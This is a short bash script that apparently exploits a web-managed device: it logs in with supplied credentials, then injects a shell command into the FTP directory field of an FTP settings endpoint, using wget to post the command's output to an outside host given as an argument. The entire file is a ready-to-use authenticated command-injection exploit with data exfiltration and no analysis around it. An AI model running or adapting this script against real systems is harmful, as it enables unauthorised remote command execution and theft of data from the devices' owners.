RAND=$RANDOM

curl -X POST "$1/" -d "login_id=$2&check_pw_status=0&login_pw=$3" -H "Cookie: PHPSESSID=x$RAND; last_floor=1" -H "X-Requested-With: XMLHttpRequest"
echo ""
echo "---------------------------------------------------"
echo "If 'window.location.reload();' you should be logged"
echo ""
echo "---------------------------------------------------"
sleep 1
curl -X POST "$1/?c=ftp&m=update3" -d "No=1&mode=test&FTPEnable=1&FTPAddress=&FTPPort=&FTPID=&FTPPassword=&FTPDir=%24(wget+--post-data=\"%24($4)\"%20$5)" -H "Cookie: PHPSESSID=x$RAND; last_floor=1"
echo ""
echo "---------------------------------------------------"
echo "If 'FTP Test failed' command has been executed and result send to $5"
